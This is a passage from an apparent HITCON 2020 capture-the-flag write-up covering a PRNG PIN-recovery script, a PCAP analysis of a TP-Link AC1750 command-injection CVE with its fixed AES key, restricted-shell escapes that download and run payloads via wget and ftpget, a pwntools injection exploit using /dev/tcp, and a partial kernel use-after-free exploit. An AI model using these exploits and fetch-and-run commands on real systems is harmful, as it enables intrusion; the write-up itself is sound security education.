partial = [] for _ in range(10): state0, state1, output = xs128p(state0, state1) for i in range(65): state0, state1, output = xs128p(state0, state1) out = math.floor(multiple * to_double(output)) partial.append(out) solutions += partial[::-1] solutions = solutions[:100] return [origin[idx] for idx in solutions] def solve(proc): proc.recvuntil(b\u0026#39;Show me sha256(\u0026#34;\u0026#39;) prefix = proc.recvuntil(b\u0026#39;\u0026#34;\u0026#39;)[:-1].decode() proc.recvuntil(b\u0026#39;ends with \u0026#34;00000\u0026#34;: \u0026#39;) guess = proof_of_work(prefix) proc.sendline(guess) # start the guessing of pins randoms = guess_random(proc) # if we don\u0026#39;t have enough pins we retry if len(randoms) != 11: print(\u0026#34;We have \u0026#34;, len(randoms)) raise Exception(\u0026#39;yeet\u0026#39;) print(\u0026#34;#################\u0026#34;) print(\u0026#34;#################\u0026#34;) print(\u0026#34;#################\u0026#34;) print(\u0026#34;#################\u0026#34;) # now we recover the states and next pins print(randoms) pins = derivePins(randoms)[len(randoms):] r = \u0026#39;\u0026#39; # we input all the pins for i in pins: proc.sendline(i) print(proc.recvline()) # we get the flag proc.interactive() return False def main(): x = True while x: try: host, port = \u0026#39;18.183.134.249\u0026#39;, 1234 with remote(host, port) as proc: x = solve(proc) except Exception as e: print(e) main() Execution # With a lot of luck\n[+] Opening connection to 18.183.134.249 on port 1234: Done found 332260 2030edc98d041ec0159f1e75a0cecacca4028f83572e34fb0f35761919a00000 2981 ; 1 after 4 tries 7109 ; 2 after 6 tries 9250 ; 3 after 11 tries 0256 ; 4 after 16 tries 9580 ; 5 after 19 tries 7129 ; 6 after 23 tries 8697 ; 7 after 26 tries 8037 ; 8 after 28 tries 4286 ; 9 after 32 tries 3416 ; 10 after 35 tries 3798 ; 11 after 39 tries ################# ################# ################# ################# [1506, 3590, 4676, 80, 4865, 3597, 4423, 4051, 2174, 1690, 1903] [+] recovered state: 5977170398082918709 6965505899860868137 b\u0026#39;Pin 12? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 13? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 14? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 15? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 16? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 17? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 18? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 19? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 20? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 21? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 22? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 23? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 24? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 25? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 26? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 27? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 28? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 29? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 30? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 31? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 32? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 33? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 34? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 35? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 36? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 37? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 38? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 39? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 40? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 41? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 42? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 43? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 44? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 45? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 46? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 47? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 48? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 49? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 50? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 51? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 52? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 53? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 54? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 55? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 56? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 57? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 58? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 59? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 60? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 61? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 62? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 63? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 64? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 65? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 66? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 67? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 68? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 69? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 70? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 71? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 72? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 73? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 74? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 75? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 76? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 77? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 78? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 79? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 80? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 81? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 82? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 83? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 84? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 85? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 86? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 87? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 88? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 89? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 90? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 91? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 92? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 93? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 94? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 95? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 96? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 97? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 98? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 99? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; b\u0026#39;Pin 100? \\x1b[1;32mOK\\x1b[0m\\n\u0026#39; [*] Switching to interactive mode FLAG Unlocked: hitcon{even_my_c4t_can_s0lve_4_digits_pin_4A999B} [*] Got EOF while reading in interactive AC1750 # My router is weird, can you help me find the problem?\nThe challenge # We are given a PCAP file which contains some communication between a computer (a macbook pro) and a router (a TP-link AC1750)\nThe PCAP # The PCAP can be divided into 3 main flows, one after the other:\nSome HTTP requests to the router web interface, which seems to be running some sort of OpenWRT, given the references to the LuCI API. Nothing too interesting here Some weird UDP traffic from the computer to port 20002 of the router which appears to be encrypted (high entropy, no recognizable strings) A TCP connection from the router to the computer on port 4321, which sends back the output of the ls command UDP port 20002 # From a quick search on the internet, we find references to CVE-2020-10882, which coincidentally affects the router we are communicating with.\nWe were able to find this extremely useful writeup which explains the details of the protocol, and of the vulnerability which causes RCE. TLDR (since it\u0026rsquo;s what we care about): it communicates using packets containing a 32-byte header and a JSON encrypted with AES-128 CBC, with the fixed key TPONEMESH_Kf!xn? and IV 1234567890abcdef1234567890abcdef.\nWithout knowing anything else about the protocol (except that the injection point is in the slave_mac JSON key), we exported the UDP traffic from wireshark as JSON and wrote this quick python script:\nfrom Crypto.Cipher import AES def decrypt(packet_hex): c = AES.new(b\u0026#39;TPONEMESH_Kf!xn?\u0026#39;,AES.MODE_CBC,b\u0026#39;1234567890abcdef\u0026#39;) enc = bytearray.fromhex(packet_hex[32:]) return c.decrypt(enc) import json f = json.loads(open(\u0026#34;traffic.json\u0026#34;).read()) for p in f: try: p = p[\u0026#39;_source\u0026#39;][\u0026#39;layers\u0026#39;][\u0026#39;udp\u0026#39;][\u0026#39;udp.payload\u0026#39;].replace(\u0026#39;:\u0026#39;,\u0026#34;\u0026#34;) #because wireshark hexdump is stupid print(json.loads(decrypt(p))[\u0026#39;data\u0026#39;][\u0026#39;slave_mac\u0026#39;][2:-1]) except Exception as e: pass Which, after a bit of cleaning, this returned\necho\u0026gt;f; printf \u0026#39;(\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;l\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;s\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39; \u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;-\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;l\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;\u0026amp;\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;\u0026amp;\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;e\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;c\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;h\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;o\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39; \u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;h\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;i\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;t\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;c\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;o\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;n\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;{\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;W\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;h\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;y\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;_\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;c\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;a\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;n\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;_\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;o\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;n\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;e\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;_\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;p\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;l\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;a\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;c\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;e\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;_\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;b\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;e\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;_\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;i\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;n\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;j\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;e\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;c\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;t\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;e\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;d\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;_\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;t\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;w\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;i\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;c\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;e\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;}\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;\u0026gt;\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;f\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;l\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;a\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;g\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;\u0026amp;\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;\u0026amp;\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;l\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;s\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39; \u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;-\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;l\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;)\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;|\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;t\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;e\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;l\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;n\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;e\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;t\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39; \u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;1\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;9\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;2\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;.\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;1\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;6\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;8\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;.\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;0\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;.\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;1\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;0\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;5\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39; \u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;4\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;3\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;2\u0026#39;\u0026gt;\u0026gt;f; printf \u0026#39;1\u0026#39;\u0026gt;\u0026gt;f; sh f; Which, when executed, creates the file f containining:\n(ls -l \u0026amp;\u0026amp; echo hitcon{Why_can_one_place_be_injected_twice}\u0026gt;flag \u0026amp;\u0026amp;l s -l)|telnet 192.168.0.105 4321 Which contains the flag!\nBaby Shock # nc 54.248.135.16 1986\nThe challenge # We can connect via netcat to a machine, which contains an extremely limited shell, where the only commands we can run are pwd ls mkdir netstat sort printf exit help id mount df du find history touch and (most of the) special characters are filtered\nThe solution # For some reason, ; is not filtered. This means that we can run any command by doing id ; mycommand, as long as mycommand does not contain special characters (such as -, so most flags are forbidden).\nAlso, the . is restricted, and cannot appear more than once in a command.\nSo first we execute:\nid ; wget 123456789 where 123456789 is the IP (encoded as decimal number) of a HTTP serve we control, that hosts an index.html containing shell commands.\nWe then execute it via the command:\nid ; sh index.html Which allows us to explore the filesystem, and see that there is a readFlag binary in /. By executing it we get the flag.\nRevenge of Baby Shock # nc 18.178.60.6 1987\nThe challenge # It\u0026rsquo;s identical to baby shock, but more characters are forbidden, including ; and even a single .\nThe solution # One of the (very few) special characters allowed are (). With these, it\u0026rsquo;s possible to declare functions.\nThis means that we can do\n\u0026gt; id () whoami \u0026gt; id whoami: unknown uid 1129 To redefine one of the allowed commands (in this case id) to a function that executes our desired command.\nWithout the ., we couldn\u0026rsquo;t use the same trick as before to execute the reverse shell, as wget by default saves the downloaded files as index.html (and to change that name, a flag starting with - is required).\nLuckily, the server was running busybox, which contains the ftpget utility, with the much simper syntax of ftpget HOST LOCAL_FILE REMOTE_FILE.\nSo we run the following commands\nid () ftpget 123456789 payload payload id to download via FTP the payload file from our server with ip 123456789 (decimal encoded), which contains the command /readFlag, and then\nid () sh payload id To execute it and read the flag, which is hitcon{r3v3ng3_f0r_semic010n_4nd_th4nks}.\nRevenge of Pwn # Have you ever thought those challenges you pwned may retaliate someday?\nnc 3.115.58.219 9427\nThe challenge # Our task is to write an exploit to \u0026ldquo;pwn\u0026rdquo; a pwntools Python script that runs on the remtoe server. When we connect, we can upload an executable: this executable is then saved and exposed in the local server on port 1337. Then, the Python script is started and connects to it. Our executable does not have the right to read the flag, which is at /home/deploy/flag, but the Python script does. We need to find a way to make it read and spit out that file.\nThe Python script does the following:\nStart listening on port 31337. Expect to receive a string containing a stack address (stack address @ 0xXXX) from the program right away. Prepare and send a shellcode to the program. The shellcode is meant to leak an fd number from the stack and send it back as a decimal string to the Python script by conencting back to port 31337. The code sends the fd number followed by a @ character. Receive the leaked fd on port 31337, using s.recvuntil('@'). Use the value to craft some more shellcode which is then sent to our program. The vulnerability # When receiving the fd number, the Python script treats it as a string without converting it to integer. When passing the string to the shellcraft function of pwntools, this value is directly inserted into an assembly program that is then passed to cpp (compiler) to evaluate preprocessor macros and then to as (assembler) to assemble it into the actual shellcode.\nSince we have control on the \u0026ldquo;vulnerable\u0026rdquo; program that the script tries to connect to, after sending a fake stack address, we can just connect back to the script on port 31337 and send an arbitrary string followed by @. This string will then be passed to shellcraft, and it ends up in the middle of the assembly program that is being compiled into shellcode.\nThe exploit # The remote server says \u0026ldquo;ELF size? (MAX: 6144)\u0026rdquo; when connecting, which makes it seems like it only accepts an ELF file. Sure, we could craft a very simple ELF that does a write plus connect, no big deal. However, as it turns out, no check is made on the server side on the kind of file received, so we can send any kind of file and the serer will mark it as executable and run it. We can therefore simply send a Bash script as executable and make our life 10 times easier.\nNow in our executable we could just send .incbin \u0026quot;/home/deploy/flag\u0026quot; and have as include the flag as raw bytes in the resulting shellcode that is then sent back to us, but pwntools makes some very strict sanity checks on our string before actually inserting it into the assembly. Our string can only be a valid Python expression: it is compiled using compile() and the resulting bytecode is checked against a whitelist of Python opcodes before being evaluated and inserted in the assembly. Long story short, we nee to pass this check and cannot just send arbitrary stuff.\nSince the assembly will be parsed by cpp, it can contain valid C preprocessor directives, like for example #include. Luckily, # in Python delimits the start of a comment, which is completely ignored by compile(). We can therefore send a number followed by a newline and then #include \u0026lt;/home/deploy/flag\u0026gt;@.\nHere\u0026rsquo;s the complete exploit:\n#!/bin/bash # @mebeim - 2020-11-29 { cat \u0026lt;\u0026lt;EOF 122 #!/bin/bash echo \u0026#39;stack address @ 0x1234\u0026#39; sleep 1 echo -e \u0026#39;123\\n#include \u0026#34;/home/deploy/flag\u0026#34;@\u0026#39; \u0026gt; /dev/tcp/127.0.0.1/31337 EOF } | nc 3.115.58.219 9427 This will result in the remote pwntools trying to compile something like this:\npush 123 #include \u0026lt;/home/deploy/flag\u0026gt; push 16384 Which will make cpp include the flag in the file. Afterwards, when passing the file to as, it will die because the source is invalid, and make pwntools dump the script and the flag to stderr:\n[ERROR] An error occurred while assembling: 1: .section .shellcode,\u0026#34;awx\u0026#34; 2: .global _start 3: .global __start 4: _start: 5: __start: 6: .intel_syntax noprefix 7: stager_3: 8: push 123 9: hitcon{use_pwntools_to_pwn_pwntools_^ovo^} 10: push 16384 ... ... /var/tmp/pwn-asm-bslk3jq9/step1:9: Error: no such instruction: `hitcon{use_pwntools_to_pwn_pwntools_^ovo^}\u0026#39; Atoms # A TOken-based Memory Storage.\nnc 13.231.7.116 9427\nChallenge Release Content # file comment run.sh bash script to run the challenge linux.diff a patch that was applied to the kernel initramfs.cpio.gz the system (binaries, libraries, etc.) demo.c source code of the test module demo a sample binary to test the module bzImage the kernel atoms.ko the kernel module loaded on the system The Goal of the Challenge # There was no flag file. The goal of the challenge was not standard. But looking at the released file was easy to understand the goal of the challenge. In particular, the linux.diff tells us that the flag is stored in the kernel\u0026rsquo;s error messages.\nindex 7110906..beeb01f 100644 --- a/kernel/watchdog.c +++ b/kernel/watchdog.c @@ -409,9 +409,12 @@ static enum hrtimer_restart watchdog_timer_fn(struct hrtimer *hrtimer) } } +#ifndef FLAG + #define FLAG \u0026#34;hitcon{\u0026lt;FLAG WILL BE HERE\u0026gt;}\u0026#34; +#endif pr_emerg(\u0026#34;BUG: soft lockup - CPU#%d stuck for %us! [%s:%d]\\n\u0026#34;, smp_processor_id(), duration, -\tcurrent-\u0026gt;comm, task_pid_nr(current)); +\tFLAG, task_pid_nr(current)); print_modules(); print_irqtrace_events(current); if (regs) Looking at the kernel\u0026rsquo;s original source code, we understood that the error is triggered if the core is stacked for a certain amount of time. In practice, you need to get the kernel module in deadlock.\nThe Kernel Module # This kernel module (atomos.ko) is creating a new device file /dev/atoms. It easy to understand the basic functionality of the module from the demo source code.\nPractically, you can open the device file:\nint fd = open(DEV_PATH, O_RDWR); Select/Create storage indexed by a key:\nioctl(fd, ATOMS_USE_TOKEN, TOKEN) Allocate space for you messages:\nstruct atoms_ioctl_alloc arg = { .size = 0x1000, }; assert(ioctl(fd, ATOMS_ALLOC, \u0026amp;arg) == 0); Map the storage to a userspace virtual address:\nvoid *ptr = mmap(0, 0x1000, PROT_WRITE, MAP_SHARED, fd, 0); When memory is allocated in userspace, you can read or write it:\nstrcpy((char*)ptr, \u0026#34;the secret message left by parent\u0026#34;); Remove the storage from userspace:\nmunmap(ptr, 0x1000); Close the file descriptor:\nclose(fd); The ioctl function is the most interesting part. We spent some time to reverse engineer the details. There are 4 basic commands for ioctl.\nATOMS_USE_TOKEN 0x4008D900 // set the current pool to a token ATOMS_ALLOC 0xC010D902 // allocate memory for current pool ATOMS_RELEASE 0xD903 // clean up the pool ATOMS_INFO 0x8018D901 // return info about the current pool The module internally has the concept of pool. A pool is identified by a token and contains the messages (memory pages) corresponding to a specific token The kernel has a global variable that is an array of pools. It can store up to 1024 pools.\nThe Locks # The module uses the kernel function raw_spin_lock to set up a lock on several resources. We identified three types of locks:\nfd_lock: This is a locking done on a file descriptor. The resource is stored in priv_data of the fd kernel structure. pools_lock: This lock is done when accessing the global variable array containing all the pools. This resource is stored as a global variable as well. tk_lock: A lock that is used to control access to a specific pool/token. This resource is store as part of the pool structure. The Ref Counter # Internally, the pool is a structure that looks like this:\nstruct __attribute__((aligned(8))) s_pool { _QWORD token; __int32 ref_counter; _DWORD lock; msg msgs[16]; }; token is the identifier of the pool, lock is the resource used for locking mechanism. msgs are the pages/messages stored in the pool.\nref_counter is counting how many things have a reference to this pool. The ref_counter is set to one when the pool is selected with the token. When ref_counter reaches zero, all pool contents are set free (atoms_mem_put). Ideally should reach zero only when the fd is closed. mapping a page increase the counter by 1, unmapping a page decrease the counter by 1.\nThe (Unintented) Vulnerability. # The challenge\u0026rsquo;s obvious goal was to get some of the locks interleaved to end up in a deadlock. We did not find such a combination. There is an exploit with the intended solution posted by the author david942j. At the time of writing, I (jinblack) do not understand that exploit. We exploited a User After Free that we stumbled on while experimenting.\nIf you map a message with multiple pages, the ref_counter is increased by 1. If you unmap pages singularly, each munmap decrease the counter by 1. This allows us to get the counter to zero even if the fd is not closed yet.\nWhen the ref_counter reaches 0, the structure containing information of the selected token is set free. But because the fd is still alive, we can keep doing operations with that pool.\nWith this vulnerability, our focus changed from getting a deadlock to crash the kernel to just crash the kernel.\nThe Exploit # We modified the demo.c program to:\nallocate multiple pages. deallocate pages singularly until ref_counter reaches 0, spawn several children that use the module. monitor if the values in the current chunk change with ATOMS_INFO. when the value changes, we just try to use the module, expecting a crash. The exploit is not 100% reliable. It happens (quite often) that the program terminates without a crash. We just run the program several times.\n#include \u0026lt;assert.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define ATOMS_USE_TOKEN 0x4008D900 #define ATOMS_ALLOC 0xC010D902 #define ATOMS_RELEASE 0xD903 #define ATOMS_INFO 0x8018D901 struct atoms_ioctl_alloc { uint64_t size; uint64_t unk; }; struct atoms_ioctl_info { uint64_t token; uint64_t num; uint64_t index; }; #define DEV_PATH \u0026#34;/dev/atoms\u0026#34; #define TOKEN 0xdeadbeef static void print_info(int fd){ struct atoms_ioctl_info arg= { .token = 0x0, .num = 0x0, .index = 0x0, }; assert(ioctl(fd, ATOMS_INFO, \u0026amp;arg) == 0); printf(\u0026#34;token: %lx\\t num %lx\\t index %lx\\n\u0026#34;, arg.token, arg.num, arg.index); } static int get_token(int fd){ struct atoms_ioctl_info arg= { .token = 0x0, .num = 0x0, .index = 0x0, }; assert(ioctl(fd, ATOMS_INFO, \u0026amp;arg) == 0); return arg.token; } static void hex_printer(uint8_t *c, int size){ for(int i=0; i \u0026lt; size; i++){ printf(\u0026#34;%02x \u0026#34;, c[i]); } puts(\u0026#34;\u0026#34;); } static int open_atoms(){ int fd = open(DEV_PATH, O_RDWR); assert(fd \u0026gt;= 0); return fd; } static void set_token(int fd, uint64_t token){ assert(ioctl(fd, ATOMS_USE_TOKEN, token) == 0); } static void set_token_noa(int fd, uint64_t token){ printf(\u0026#34;s_token %x\\n\u0026#34;, ioctl(fd, ATOMS_USE_TOKEN, token)); } static void alloca_size(int fd, uint32_t size){ struct atoms_ioctl_alloc arg = { .size = size, }; assert(ioctl(fd, ATOMS_ALLOC, \u0026amp;arg) == 0); } static void *mappa(int fd, uint64_t size){ void *ptr = mmap(0, size, PROT_WRITE | PROT_READ, MAP_SHARED, fd, 0); printf(\u0026#34;mem: %p\\n\u0026#34;, ptr); assert(ptr != MAP_FAILED); return ptr; } static void release(int fd){ assert(ioctl(fd, ATOMS_RELEASE) == 0); } static void fill_a_token(uint64_t token, int size){ int fd = open_atoms(); set_token(fd, token); for (int i=0; i \u0026lt; 16; i++) alloca_size(fd, size); } static void child_work() { printf(\u0026#34;[child] start\\n\u0026#34;); int fd = open_atoms(); set_token(fd, 0x41424344); char *ptr = mappa(fd, 0x1000); printf(\u0026#34;mem: %p\\n\u0026#34;, ptr); release(fd); munmap(ptr, 0x1000); close(fd); } static void parent_work(int argc, char *argv[]) { int fd = open_atoms(); puts(\u0026#34;before set token\u0026#34;); set_token(fd, TOKEN); // allocate a multiple pages 